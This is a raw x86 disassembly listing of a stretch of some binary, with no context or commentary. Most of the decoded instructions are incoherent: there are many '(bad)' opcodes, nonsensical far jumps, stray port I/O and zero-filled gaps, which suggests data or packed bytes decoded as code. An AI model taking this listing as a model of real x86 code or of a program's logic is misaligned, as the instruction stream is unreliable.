  425e8e:	xchg   esi,eax
  425e8f:	adc    eax,0x99c77a6a
  425e94:	sub    eax,0xaa44a8a7
  425e99:	add    eax,0xbdd0d01c
  425e9e:	add    ah,BYTE PTR [esi+eiz*2+0x354cb17c]
  425ea5:	xchg   esp,eax
  425ea6:	ins    DWORD PTR es:[edi],dx
  425ea7:	mov    ch,0xc1
  425ea9:	mov    al,cl
  425eab:	mov    al,ds:0x680519a0
  425eb0:	repnz fadd st(3),st
  425eb3:	mov    cl,0xb
  425eb5:	mov    cl,0xd7
  425eb7:	rol    DWORD PTR [esi+esi*1-0x6606ef8e],0x96
  425ebf:	call   0x4e57a10
  425ec4:	xlat   BYTE PTR ds:[ebx]
  425ec5:	(bad)  
  425ec6:	bound  edx,QWORD PTR [ecx+0x5d]
  425ec9:	es jp  0x425f3d
  425ecc:	mov    esp,0x14e80dea
  425ed1:	sbb    al,0xfd
  425ed3:	pop    edx
  425ed4:	jae    0x425e82
  425ed6:	cmp    al,0x9
  425ed8:	push   ebp
  425ed9:	dec    esp
  425eda:	sbb    BYTE PTR [edx-0x6ebd642d],ch
  425ee0:	xchg   edi,eax
  425ee1:	xchg   ebp,eax
  425ee2:	push   0x2e2f25f8
  425ee7:	(bad)  
  425ee8:	cmp    DWORD PTR [edx],edx
  425eea:	jns    0x425eb7
  425eec:	pop    ecx
  425eed:	lock sbb eax,0x261f251d
  425ef3:	jo     0x425f19
  425ef5:	(bad)  
  425ef7:	int3   
  425ef8:	leavew 
  425efa:	or     DWORD PTR [ecx],ecx
  425efc:	out    dx,eax
  425efd:	xchg   ecx,eax
  425efe:	test   DWORD PTR [edx+0xcbf68ab],ebx
  425f04:	ret    
  425f05:	push   ecx
  425f06:	inc    edx
  425f07:	mov    bl,0xb5
  425f09:	or     al,0x83
  425f0b:	jae    0x425f35
  425f0d:	fstp   QWORD PTR [eax+ebx*1]
  425f10:	mov    al,0x79
  425f12:	iret   
  425f13:	xor    al,0x62
  425f15:	cld    
  425f16:	(bad)  
  425f17:	cld    
  425f18:	imul   edx,esi,0xffffffb7
  425f1b:	das    
  425f1c:	scas   eax,DWORD PTR es:[edi]
  425f1d:	dec    eax
  425f1e:	pop    es
  425f1f:	pop    eax
  425f20:	push   esi
  425f21:	cmp    cl,al
  425f23:	mov    eax,DWORD PTR [edi]
  425f25:	rol    DWORD PTR [edi-0x3dc76d16],0x78
  425f2c:	in     eax,0x3f
  425f2e:	repz add BYTE PTR [eax],al
	...
  425f39:	add    BYTE PTR [edx],cl
  425f3b:	xchg   edx,eax
  425f3c:	jl     0x425f77
  425f3e:	cld    
  425f3f:	dec    DWORD PTR [edi-0x4d]
  425f42:	or     DWORD PTR [eax+eax*1],ebp
  425f45:	sub    esp,DWORD PTR [ebx+0x2f]
  425f48:	mov    esi,0x1d68ae2
  425f4d:	add    ch,bh
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    BYTE PTR [esi-0x4696136],ch
  425f57:	pop    edi
  425f58:	out    dx,al
  425f59:	mov    ecx,0x8c26f6fd
  425f5e:	aad    0xd9
  425f60:	outs   dx,DWORD PTR ds:[esi]
  425f61:	stos   DWORD PTR es:[edi],eax
  425f62:	jp     0x425fd4
  425f64:	lds    edi,FWORD PTR [edi]
  425f66:	sbb    esp,ebp
  425f68:	popf   
  425f69:	mov    BYTE PTR [esp+ebx*4+0x2bc098f7],cl
  425f70:	ret    
  425f71:	dec    esp
  425f72:	inc    esi
  425f73:	addr16 iret 
  425f75:	fnstsw WORD PTR [edx-0x62]
  425f78:	es jo  0x425f30
  425f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f7c:	(bad)  
  425f7d:	adc    edx,DWORD PTR [edi-0x66]
  425f80:	or     ecx,DWORD PTR [ebx+eiz*2+0x6c0de31c]
  425f87:	xor    eax,0xc16d21f1
  425f8c:	mov    bl,BYTE PTR [edx+0x38]
  425f8f:	inc    ebp
  425f90:	push   ss
  425f91:	loope  0x425f3a
  425f93:	outs   dx,DWORD PTR ds:[esi]
  425f94:	xchg   esi,eax
  425f95:	imul   esi,DWORD PTR [esi],0xffffffb9
  425f98:	fldcw  WORD PTR [esp+ecx*1-0x6dc55de9]
  425f9f:	cmp    ah,BYTE PTR [eax]
  425fa1:	xlat   BYTE PTR ds:[ebx]
  425fa2:	mov    dh,BYTE PTR gs:[edi-0x1ba70f4d]
  425fa9:	loope  0x426015
  425fab:	or     DWORD PTR [esi-0x3c],esi
  425fae:	(bad)  [ecx+ebx*1-0x1bef48fc]
  425fb5:	sbb    al,0x55
  425fb7:	adc    al,0xdc
  425fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fba:	jae    0x425f9a
  425fbc:	sar    edx,0x31
  425fbf:	sbb    dh,cl
  425fc1:	sbb    al,0x18
  425fc3:	xchg   edi,eax
  425fc4:	mov    ah,0x9d
  425fc6:	sub    al,0x74
  425fc8:	inc    edi
  425fc9:	push   esp
  425fca:	or     bh,dl
  425fcc:	mov    ah,0xd2
  425fce:	iret   
  425fcf:	bound  ebp,QWORD PTR [edx+eax*4-0x55]
  425fd3:	sbb    al,BYTE PTR [ebx-0x4850c411]
  425fd9:	adc    al,0xa7
  425fdb:	(bad)  
  425fdc:	push   eax
  425fdd:	mov    WORD PTR [ecx-0x71],fs
  425fe0:	dec    edi
  425fe1:	adc    cl,BYTE PTR [edi+0x5d668f0e]
  425fe7:	loop   0x425fc4
  425fe9:	mov    cl,0xcc
  425feb:	jo     0x426043
  425fed:	xchg   edi,eax
  425fee:	test   al,0xe8
  425ff0:	dec    edx
  425ff1:	dec    esp
  425ff2:	leave  
  425ff3:	neg    BYTE PTR [edx-0x3f46a6]
  425ff9:	or     DWORD PTR [ebp-0x773839c],eax
  425fff:	stc    
  426000:	out    dx,al
  426001:	imul   esi,DWORD PTR [ecx],0x3c
  426004:	retf   
  426005:	nop
  426006:	xor    BYTE PTR [esi-0x119b31f8],0x15
  42600d:	push   ebx
  42600e:	fisttp WORD PTR ds:0xf3d34c1b
  426014:	mov    BYTE PTR [esi+eax*8-0x46],bl
  426018:	push   esi
  426019:	mov    bl,ah
  42601b:	aam    0x88
  42601d:	test   eax,0xaed1afe
  426022:	and    al,0xfd
  426024:	add    ebp,ebp
  426026:	sub    al,0x48
  426028:	inc    edx
  426029:	js     0x425fcd
  42602b:	mov    bl,0x98
  42602d:	xchg   edx,eax
  42602e:	jbe    0x426037
  426030:	xor    eax,esp
  426032:	cmc    
  426033:	add    dh,BYTE PTR [ecx+0x28f06868]
  426039:	dec    esp
  42603a:	inc    eax
  42603b:	mov    edx,0xec8f167e
  426040:	mov    bl,0x43
  426042:	lea    eax,[edx]
  426044:	or     ch,dh
  426046:	xchg   edx,eax
  426047:	pop    ss
  426048:	push   ebx
  426049:	mov    eax,ds:0xbd75e3
  42604e:	dec    esi
  42604f:	icebp  
  426050:	pop    ebx
  426051:	mov    eax,ds:0x82d83335
  426056:	or     al,0xbc
  426058:	cld    
  426059:	and    al,0xd3
  42605b:	inc    edi
  42605c:	(bad)  
  42605d:	jmp    0x426063
  42605f:	sub    esp,ebx
  426061:	repz and al,0x95
  426064:	aaa    
  426065:	push   edi
  426066:	and    al,0xa2
  426068:	inc    esp
  426069:	xor    DWORD PTR [edi-0x32],ebp
  42606c:	pop    ss
  42606d:	add    ebx,DWORD PTR [esi-0x59bd81a5]
  426073:	out    0xd,al
  426075:	xor    BYTE PTR ds:0x1ce82db1,bh
  42607b:	add    edx,DWORD PTR [ebx-0x7a24468b]
  426081:	add    ebp,ebp
  426083:	mov    DWORD PTR [ecx],esi
  426085:	sub    al,0xd6
  426087:	test   BYTE PTR [eax+esi*2+0xd],ch
  42608b:	sbb    ch,BYTE PTR [esi]
  42608d:	add    BYTE PTR [eax-0x4efed7a5],dl
  426093:	loope  0x4260b3
  426095:	dec    ecx
  426096:	or     BYTE PTR ds:0x8c399294,ch
  42609c:	sti    
  42609d:	(bad)  
  42609e:	(bad)  
  42609f:	(bad)  
  4260a1:	outs   dx,DWORD PTR ds:[esi]
  4260a2:	nop
  4260a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260a4:	mov    bh,0xb5
  4260a6:	out    dx,eax
  4260a7:	lods   eax,DWORD PTR ds:[esi]
  4260a8:	adc    al,0x89
  4260aa:	pop    edi
  4260ab:	inc    eax
  4260ac:	iret   
  4260ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260ae:	xchg   esp,eax
  4260af:	cmp    BYTE PTR [esi],ah
  4260b1:	enter  0x5ab3,0x32
  4260b5:	sbb    al,0xd5
  4260b7:	cmp    ebx,DWORD PTR [edi+0x17]
  4260ba:	or     eax,0x5b6b663c
  4260bf:	sub    esp,DWORD PTR [eax+eiz*1+0x19]
  4260c3:	(bad)  
  4260c4:	ja     0x426138
  4260c6:	mov    ds:0xc73c803,eax
  4260cb:	xchg   edx,eax
  4260cc:	dec    ebx
  4260cd:	scas   eax,DWORD PTR es:[edi]
  4260ce:	push   edi
  4260cf:	(bad)
  4260d3:	int    0x29
  4260d5:	pop    edx
  4260d6:	rol    BYTE PTR [ecx-0x44],cl
  4260d9:	pop    edi
  4260da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260db:	aam    0xdf
  4260dd:	das    
  4260de:	mov    DWORD PTR [esi],0xdf9522cf
  4260e4:	fdivr  DWORD PTR [eax+eax*4-0x17]
  4260e8:	cld    
  4260e9:	fild   WORD PTR [ebx+0x4b]
  4260ec:	outs   dx,BYTE PTR ds:[esi]
  4260ed:	iret   
  4260ee:	repnz dec esi
  4260f0:	jne    0x426138
  4260f2:	jae    0x426142
  4260f4:	sbb    DWORD PTR [eax],0x2b
  4260f7:	xchg   edi,ebp
  4260f9:	ins    DWORD PTR es:[edi],dx
  4260fa:	mov    BYTE PTR [ebx-0x69],cl
  4260fd:	add    edi,DWORD PTR [esi+ebp*2-0x3bc816db]
  426104:	pop    ecx
  426105:	and    eax,0xeb878ef6
  42610a:	mov    es,WORD PTR [esi]
  42610c:	cdq    
  42610d:	iret   
  42610e:	cmp    eax,0x72200302
  426113:	mov    ds:0x4bfa5ff2,al
  426118:	mov    al,0xa8
  42611a:	fst    st(0)
  42611c:	ss sti 
  42611e:	jp     0x426152
  426120:	pop    ds
  426121:	adc    al,0x1c
  426123:	lds    edx,FWORD PTR fs:[ecx+0x1f167771]
  42612a:	xchg   BYTE PTR [ebx],bh
  42612c:	data16 sbb BYTE PTR [edx+0x25095e0a],0x7e
  426134:	fmul   DWORD PTR [ecx+0x67d31e7e]
  42613a:	popa   
  42613b:	out    dx,eax
  42613c:	push   es
  42613d:	arpl   WORD PTR [ecx+edx*2+0x7a],dx
  426141:	push   esi
  426142:	rcl    BYTE PTR [eax+0x6e],cl
  426145:	jmp    0xc8beb3cc
  42614a:	add    BYTE PTR [edx+0x4f],0x85
  42614e:	aam    0x0
	...
  426158:	add    BYTE PTR [eax],al
  42615a:	ret    
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	scas   al,BYTE PTR es:[edi]
  426167:	and    bh,BYTE PTR [edx]
  426169:	inc    ecx
  42616a:	xchg   eax,ebx
  42616c:	add    DWORD PTR [eax],eax
  42616e:	std    
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [ecx-0x664ee33c],ch
  426177:	or     ch,BYTE PTR [ebx]
  426179:	test   DWORD PTR [ebx-0x74],esi
  42617c:	jo     0x42613b
  42617e:	mov    eax,ds:0x1293a3a6
  426183:	ror    dh,0x5
  426186:	inc    esi
  426187:	inc    esi
  426188:	add    dh,ch
  42618a:	(bad)  
  42618b:	aas    
  42618c:	retf   0x1aaf
  42618f:	sar    DWORD PTR [eax],0x40
  426192:	sub    cl,BYTE PTR [ecx]
  426194:	fidiv  WORD PTR [ebx+ebp*4]
  426197:	sbb    al,0x11
  426199:	sbb    al,0x34
  42619b:	mov    ebx,0x4690c6ed
  4261a0:	inc    ebx
  4261a1:	pop    ds
  4261a2:	sub    DWORD PTR [edi-0x675a4aeb],edi
  4261a8:	test   eax,0xedba51b9
  4261ad:	dec    eax
  4261ae:	jbe    0x426175
  4261b0:	and    eax,0x145f2554
  4261b5:	dec    eax
  4261b6:	xor    BYTE PTR [eax],al
  4261b8:	sub    dl,bh
  4261ba:	adc    al,0x1e
  4261bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261bd:	mov    eax,0x650fc2e4
  4261c2:	sahf   
  4261c3:	not    BYTE PTR [ecx+0xc]
  4261c6:	sbb    dl,BYTE PTR [ecx+0x6f]
  4261c9:	jmp    0x4261b3
  4261cb:	add    BYTE PTR [edi],ch
  4261cd:	xchg   esi,eax
  4261ce:	(bad)  
  4261d1:	clc    
  4261d2:	push   eax
  4261d3:	outs   dx,BYTE PTR ds:[esi]
  4261d4:	mov    ds:0x4933b31d,al
  4261d9:	aad    0x32
  4261db:	mov    al,0xba
  4261dd:	repz or DWORD PTR [edx+0x56ff1db0],ebx
  4261e4:	pop    esi
  4261e5:	(bad)  
  4261e6:	out    dx,al
  4261e7:	mov    cs,WORD PTR [eax]
  4261e9:	arpl   WORD PTR [esp+eiz*4+0x2fbc6cd8],sp
  4261f0:	(bad)  
  4261f1:	sub    al,0x5e
  4261f3:	xchg   esi,eax
  4261f4:	mov    bh,0x3d
  4261f6:	lea    edx,[edx+0x2a]
  4261f9:	cs adc ah,ch
  4261fc:	jbe    0x426207
  4261fe:	pop    ebx
  4261ff:	push   edx
  426200:	mov    al,0xc7
  426202:	in     eax,0x3e
  426204:	and    esi,edi
  426206:	fucomip st,st(0)
  426208:	add    ah,bh
  42620a:	add    BYTE PTR ds:0xaa336d4e,dh
  426210:	nop
  426211:	mov    ebx,0x83ed1e1a
  426216:	in     al,dx
  426217:	retf   0x684d
  42621a:	pop    edi
  42621b:	out    0x85,al
  42621d:	xor    BYTE PTR [ebp+edi*8+0x65],ah
  426221:	outs   dx,BYTE PTR ds:[esi]
  426222:	inc    ebp
  426223:	sti    
  426224:	stc    
  426225:	aas    
  426226:	mov    edi,DWORD PTR [ebx-0x29fb6efa]
  42622c:	daa    
  42622d:	push   0xff7734d1
  426232:	add    dh,BYTE PTR [esi+0x5420fea0]
  426238:	mov    dh,BYTE PTR [edi]
  42623a:	cs out 0x65,al
  42623d:	inc    edi
  42623e:	mov    edi,0x4c5decdb
  426243:	add    DWORD PTR [ebp-0x77],esi
  426246:	cmp    DWORD PTR ds:0x6eb747f7,0x35
  42624d:	push   edi
  42624e:	inc    ecx
  42624f:	shr    dl,0x98
  426252:	inc    edi
  426253:	push   esp
  426254:	fwait
  426255:	inc    ebx
  426256:	push   0x70c724fd
  42625b:	out    dx,eax
  42625c:	ret    0xe586
  42625f:	or     ebx,DWORD PTR [esi]
  426261:	retf   0x3007
  426264:	sub    eax,0x735e84e1
  426269:	adc    DWORD PTR [ebx],esp
  42626b:	pop    ebx
  42626c:	push   es
  42626d:	jne    0x426255
  42626f:	rol    BYTE PTR [esp+ebx*4],1
  426272:	loop   0x4262a0
  426274:	xchg   al,ah
  426276:	xchg   edx,eax
  426277:	xchg   esi,eax
  426278:	ret    
  426279:	imul   edx,eax,0xe0985769
  42627f:	xchg   DWORD PTR [esi+0x4e],eax
  426282:	sub    ebp,DWORD PTR [ecx-0x2a9162a6]
  426288:	repnz scas eax,DWORD PTR es:[edi]
  42628a:	push   0x6a3cbd62
  42628f:	dec    ebx
  426290:	out    0xa2,eax
  426292:	inc    ecx
  426293:	push   eax
  426294:	lea    eax,[edi]
  426296:	(bad)  
  426298:	push   0x2
  42629a:	imul   esi,DWORD PTR [ebp+0x54440488],0x41
  4262a1:	adc    DWORD PTR [ebx-0x4c854a44],esi
  4262a7:	out    0x3c,al
  4262a9:	out    dx,eax
  4262aa:	fxch   st(7)
  4262ac:	mov    bl,0x36
  4262ae:	push   0xffffff90
  4262b0:	mov    bh,0xd2
  4262b2:	or     eax,0x7d9cd2c8
  4262b7:	dec    eax
  4262b8:	xor    BYTE PTR [ecx+0xa],bh
  4262bb:	loopne 0x42631e
  4262bd:	jl     0x4262e7
  4262bf:	adc    DWORD PTR [edi+0x34],eax
  4262c2:	and    ecx,DWORD PTR [edi]
  4262c4:	mov    esp,0xa752aeef
  4262c9:	sub    eax,0x7a2cfc71
  4262ce:	ret    
  4262cf:	(bad)  
  4262d0:	pop    esp
  4262d1:	xchg   dh,bl
  4262d3:	mov    eax,0xac5906f1
  4262d8:	xor    bl,ch
  4262da:	outs   dx,BYTE PTR ds:[esi]
  4262db:	push   ecx
  4262dc:	in     al,0x2e
  4262de:	push   ebp
  4262df:	cs aaa 
  4262e1:	cmp    al,0x51
  4262e3:	div    BYTE PTR [edx+0x74]
  4262e6:	mov    eax,ds:0xbf664bbe
  4262eb:	jbe    0x4262d2
  4262ed:	loope  0x4262e3
  4262ef:	sbb    al,0x1e
  4262f1:	fisttp WORD PTR [ebp+ebp*2+0x34]
  4262f5:	push   edx
  4262f6:	adc    DWORD PTR [edi],ebp
  4262f8:	fidiv  WORD PTR [esi+0x6d]
  4262fb:	mov    BYTE PTR [eax],bl
  4262fd:	call   0xc01b3ae8
  426302:	push   eax
  426303:	xchg   bh,dl
  426305:	mov    dh,0xc1
  426307:	pop    ebx
  426308:	dec    esi
  426309:	retf   0x9631
  42630c:	mov    ds:0x6116e71b,eax
  426311:	ds call 0x7458:0xd16db230
  426319:	retf   0x2c01
  42631c:	ss adc eax,0x66e7955d
  426322:	leave  
  426323:	dec    eax
  426324:	cmp    eax,0xc8d0b720
  426329:	jmp    0xa6b:0x69a99cb6
  426330:	add    eax,0x105e801a
  426335:	inc    edi
  426336:	mov    eax,0xee6348fb
  42633b:	jns    0x42635b
  42633d:	lock dec esi
  42633f:	mov    ch,0x15
  426341:	pop    esp
  426342:	pop    ebx
  426343:	jge    0x426359
  426345:	lods   eax,DWORD PTR ds:[esi]
  426346:	sub    bh,ah
  426348:	mov    esi,0x4dd7d6eb
  42634d:	pop    eax
  42634e:	mov    ebp,0x970e844d
  426353:	mov    dh,0xd1
  426355:	test   BYTE PTR [bp+si+0x3ad8],0x70
  42635b:	into   
  42635c:	ins    DWORD PTR es:[edi],dx
  42635d:	in     al,dx
  42635e:	jbe    0x426395
  426360:	inc    edi
  426361:	loope  0x426323
  426363:	shl    ebx,1
  426365:	mov    eax,ds:0x645aaff3
  42636a:	imul   ebx,ebx,0x66
  42636d:	mov    dl,0x35
	...
  426377:	add    BYTE PTR [eax],al
  426379:	add    BYTE PTR [edx-0x101610a7],bl
  42637f:	call   FWORD PTR [esi-0x71a9f385]
  426385:	rcl    DWORD PTR [ecx+0x7e],cl
  426388:	mov    DWORD PTR [edi],ebp
  42638a:	test   dl,bl
  42638c:	add    DWORD PTR [eax],eax
  42638e:	std    
  42638f:	add    DWORD PTR [eax],eax
  426391:	add    BYTE PTR [ebx+0x64],dh
  426394:	pop    ds
  426395:	retf   
  426396:	sub    esi,DWORD PTR [esi+0x66c7fb38]
  42639c:	stos   BYTE PTR es:[edi],al
  42639d:	or     al,0x80
  42639f:	scas   eax,DWORD PTR es:[edi]
  4263a0:	les    esi,FWORD PTR [eax+0x3]
  4263a3:	push   esp
  4263a4:	mov    ah,0x3b
  4263a6:	fwait
  4263a7:	es inc edi
  4263a9:	push   ecx
  4263aa:	stc    
  4263ab:	cmp    al,0xf2
  4263ad:	mov    edx,0x60e2ef9
  4263b2:	cmp    dh,BYTE PTR [ebx-0x60]
  4263b5:	mov    esi,0x1997c8fc
  4263ba:	test   BYTE PTR [ebx-0xc],al
  4263bd:	sub    dh,0x56
  4263c0:	push   esp
  4263c1:	outs   dx,BYTE PTR ds:[esi]
  4263c2:	dec    edx
  4263c3:	js     0x426350
  4263c5:	pusha  
  4263c6:	xor    bl,BYTE PTR [ebp+0x56]
  4263c9:	test   cl,al
  4263cb:	jge    0x426430
  4263cd:	add    dl,BYTE PTR [ebp+0x1b]
  4263d0:	pop    ds
  4263d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263d2:	scas   al,BYTE PTR es:[edi]
  4263d3:	jg     0x4263f9
  4263d5:	and    dh,BYTE PTR [ebp+ecx*1-0x61e5167f]
  4263dc:	xchg   esp,eax
  4263dd:	retf   0x1dd
  4263e0:	sbb    al,ch
  4263e2:	pushf  
  4263e3:	retf   0xc9fc
  4263e6:	add    eax,0xea83ef3f
  4263eb:	sub    al,0x97
  4263ed:	push   0x2c
  4263ef:	shl    BYTE PTR [edx-0x181ba03e],0xa
  4263f6:	nop
  4263f7:	sub    DWORD PTR [esi],eax
  4263f9:	mov    ebp,DWORD PTR [esp+ecx*4]
  4263fc:	repnz sbb esp,edi
  4263ff:	jae    0x42641f
  426401:	sub    ch,BYTE PTR [ebp+0x67]
  426404:	adc    BYTE PTR [edi],ch
  426406:	test   al,0x55
  426408:	inc    esi
  426409:	cmc    
  42640a:	and    DWORD PTR [eax-0xa],0xfffffffe
  42640e:	xor    al,0xb9
  426410:	mov    bh,0xd0
  426412:	rcr    BYTE PTR [eax-0x7025f037],1
  426418:	stc    
  426419:	retf   
  42641a:	fisubr WORD PTR [edi]
  42641c:	push   ebx
  42641d:	push   edi
  42641e:	push   edi
  42641f:	lea    ebp,[ecx+esi*2]
  426422:	aaa    
  426423:	fmul   DWORD PTR [edx]
  426425:	mov    al,0x89
  426427:	cmp    eax,0x62179f6b
  42642c:	pop    ds
  42642d:	and    eax,0x4c7cd2f0
  426432:	nop
  426433:	dec    eax
  426434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426435:	push   ecx
  426436:	cwde   
  426437:	jge    0x426417
  426439:	fdivr  QWORD PTR [ebx-0x45980e3e]
  42643f:	sbb    al,0xbf
  426441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426442:	shr    DWORD PTR [ebx],1
  426444:	xlat   BYTE PTR ds:[ebx]
  426445:	xchg   ebp,eax
  426446:	or     al,0x84
  426448:	(bad)
  42644b:	or     al,bh
  42644d:	ret    
  42644e:	push   ds
  42644f:	pop    ecx
  426450:	popf   
  426451:	(bad)  
  426452:	data16 jge 0x4263df
  426455:	leave  
  426456:	mov    eax,0x8963b06f
  42645b:	fidivr WORD PTR [ecx+esi*1]
  42645e:	or     BYTE PTR [edx],ch
  426460:	pop    esi
  426461:	in     eax,0xa
  426463:	test   BYTE PTR [ecx+0x56],cl
  426466:	lods   al,BYTE PTR ds:[esi]
  426467:	outs   dx,BYTE PTR ds:[esi]
  426468:	aaa    
  426469:	jns    0x426488
  42646b:	addr16 (bad) 
  42646d:	xlat   BYTE PTR ds:[ebx]
  42646e:	mov    ch,BYTE PTR [edx+ebp*8+0x6d]
  426472:	xchg   edi,eax
  426473:	imul   ebp,DWORD PTR [esi+0x46d9087f],0x46
  42647a:	push   es
  42647b:	jae    0x42641e
  42647d:	push   ss
  42647e:	fbld   TBYTE PTR [ebp+0x307cc040]
  426484:	add    edi,esp
  426486:	dec    edi
  426487:	je     0x426481
  426489:	mov    ch,0x4a
  42648b:	cmp    BYTE PTR [ecx+0x25],0x82
  42648f:	jmp    0xe52d:0x295022e9
  426496:	or     DWORD PTR [eax-0x31],0x71
  42649a:	xchg   BYTE PTR [eax-0x7e124fcb],dh
  4264a0:	mov    eax,ds:0xe61f7093
  4264a5:	adc    eax,0x8e715b2b
  4264aa:	inc    ebx
  4264ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264ac:	and    al,0x9f
  4264ae:	add    dl,al
  4264b0:	xor    DWORD PTR [edx],ebp
  4264b2:	fidiv  DWORD PTR [edi+0x5ccf602a]
  4264b8:	test   bh,dl
  4264ba:	xchg   edx,eax
  4264bb:	push   ss
  4264bc:	test   al,0xaf
  4264be:	arpl   WORD PTR [esi],di
  4264c0:	or     al,0xab
  4264c2:	xchg   edx,eax
  4264c3:	test   WORD PTR [edi-0x50],cx
  4264c7:	mov    esp,0x26428126
  4264cc:	and    DWORD PTR [ebx+0x7a471a06],esp
  4264d2:	and    BYTE PTR [ebp+0x4b136bb3],bl
  4264d8:	in     eax,dx
  4264d9:	in     al,0x4c
  4264db:	fidiv  WORD PTR [esi]
  4264dd:	ret    
  4264de:	in     al,dx
  4264df:	xor    cl,dl
  4264e1:	ficom  DWORD PTR [edx-0x31a5ccbd]
  4264e7:	xchg   edx,eax
  4264e8:	out    dx,eax
  4264e9:	aaa    
  4264ea:	cdq    
  4264eb:	push   ecx
  4264ec:	lock mov es,esi
  4264ef:	rcl    BYTE PTR [edx+0x4fd0a745],0xb
  4264f6:	mov    ebp,0xebaa4d5a
  4264fb:	stos   DWORD PTR es:[edi],eax
  4264fc:	xchg   BYTE PTR [ebx+0x50669178],al
  426502:	inc    esi
  426503:	push   eax
  426504:	imul   edi,esp,0xb5fc7dc9
  42650a:	sub    ch,BYTE PTR [esp+edx*4+0x1d290c8a]
  426511:	mov    eax,0x2884aab1
  426516:	xor    bh,BYTE PTR [eax-0x69b21d]
  42651c:	jns    0x4264b0
  42651e:	jnp    0x4264a4
  426520:	push   ecx
  426521:	dec    esi
  426522:	ret    0x94c3
  426525:	or     DWORD PTR [ebx+ebx*1+0x69],0xfa383d52
  42652d:	jle    0x4265a4
  42652f:	jg     0x4264b5
  426531:	add    eax,0xf2c32f71
  426536:	dec    edi
  426537:	cmp    dh,BYTE PTR [edi-0x4af79922]
  42653d:	or     bl,BYTE PTR [edx]
  42653f:	in     al,dx
  426540:	fistp  DWORD PTR [eax-0x1bdf7c3c]
  426546:	sub    DWORD PTR [ebx-0x24d1a205],eax
  42654c:	xor    al,0xcc
  42654e:	cmp    ebp,0x3380b0af
  426554:	cmp    al,BYTE PTR [eax]
  426556:	inc    ebp
  426557:	in     al,dx
  426558:	test   BYTE PTR [esi],bh
  42655a:	sub    BYTE PTR [edi-0x6d],ch
  42655d:	sub    ebp,DWORD PTR [edi+eiz*8+0x39]
  426561:	push   cs
  426562:	push   eax
  426563:	and    DWORD PTR [edx+0x2a],edx
  426566:	or     al,dh
  426568:	aas    
  426569:	xchg   ebp,ebx
  42656b:	xor    eax,DWORD PTR [edi+edx*8+0x371db6b5]
  426572:	stos   DWORD PTR es:[edi],eax
  426573:	xchg   edx,eax
  426574:	xchg   ecx,eax
  426575:	test   al,0xa0
  426577:	jbe    0x426509
  426579:	bound  edi,QWORD PTR [eax+0x4d]
  42657c:	mov    cl,0x7a
  42657e:	and    ebp,0x52374f77
  426584:	loopne 0x42650f
  426586:	sbb    ebx,DWORD PTR [ebx+eax*8]
  426589:	shr    ch,0x5
  42658c:	adc    al,0xc2
  42658e:	mov    BYTE PTR [eax],0x0
	...
  426599:	add    BYTE PTR [ebp+0x4f3707c0],cl
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x42657e
  4265a7:	rol    BYTE PTR [esi],cl
  4265a9:	add    BYTE PTR [ecx-0x2fffe24],0x1
  4265b0:	add    BYTE PTR [eax],al
  4265b2:	sub    edx,DWORD PTR [esi-0x7]
  4265b5:	(bad)  
  4265b6:	imul   eax,DWORD PTR [edx+0x34fe2875],0x3d4634a0
  4265c0:	stos   BYTE PTR es:[edi],al
  4265c1:	push   edx
  4265c2:	cld    
  4265c3:	pop    eax
  4265c4:	int    0x1c
  4265c6:	inc    ebp
  4265c7:	adc    al,0xd3
  4265c9:	cmp    edi,esi
  4265cb:	inc    eax
  4265cc:	pop    esi
  4265cd:	call   FWORD PTR [edx]
  4265cf:	mov    edx,DWORD PTR [ebx+edx*8]
  4265d2:	jne    0x42661a
  4265d4:	or     al,0x78
  4265d6:	inc    esi
  4265d7:	mov    ebx,gs
  4265d9:	fnstcw WORD PTR cs:[eax]
  4265dc:	fmulp  st(4),st
  4265de:	imul   ecx,DWORD PTR [eax+0x60e67b0],0x2b
  4265e5:	jg     0x42662b
  4265e7:	sar    BYTE PTR [edx-0x5f],0x1f
  4265eb:	test   BYTE PTR [edi],bh
  4265ed:	mov    ?,WORD PTR [edx]
  4265ef:	xor    eax,0x3ba1fba3
  4265f4:	js     0x426626
  4265f6:	push   edi
  4265f7:	pop    ecx
  4265f8:	imul   ebx,DWORD PTR [eax],0x37874ef4
  4265fe:	nop
  4265ff:	(bad)  
  426600:	lods   al,BYTE PTR ds:[esi]
  426601:	dec    di
  426603:	test   al,0x88
  426605:	popa   
  426606:	out    dx,al
  426607:	and    DWORD PTR [edi+0x3],esp
  42660a:	jmp    0x4265b3
  42660c:	jnp    0x4265a9
  42660e:	fwait
  42660f:	outs   dx,DWORD PTR ds:[esi]
  426610:	ins    BYTE PTR es:[edi],dx
  426611:	cld    
  426612:	pop    edx
  426613:	push   eax
  426614:	scas   eax,DWORD PTR es:[edi]
  426615:	(bad)  
  426616:	xor    BYTE PTR [ecx],ah
  426618:	imul   esp,DWORD PTR [edi-0x250dc58],0x68
  42661f:	dec    esi
  426620:	mov    al,0x74
  426622:	int    0x3e
  426624:	test   bl,bh
  426626:	inc    esp
  426627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426628:	or     DWORD PTR [edx+0x340947e7],0x31
  42662f:	adc    bh,bh
  426631:	cmp    al,0x36
  426633:	cmp    DWORD PTR [ecx+0x52],ecx
  426636:	mov    WORD PTR [esi],ss
  426638:	xor    dl,BYTE PTR cs:[esi]
  42663b:	ret    
  42663c:	fs das 
  42663e:	sub    ecx,DWORD PTR [ebx-0x19]
  426641:	adc    DWORD PTR [ebp-0x148992c3],ebx
  426647:	or     al,0xce
  426649:	mov    ecx,0xda5715f8
  42664e:	bound  edx,QWORD PTR [edx+0x6cefe760]
  426654:	add    bh,BYTE PTR [edx]
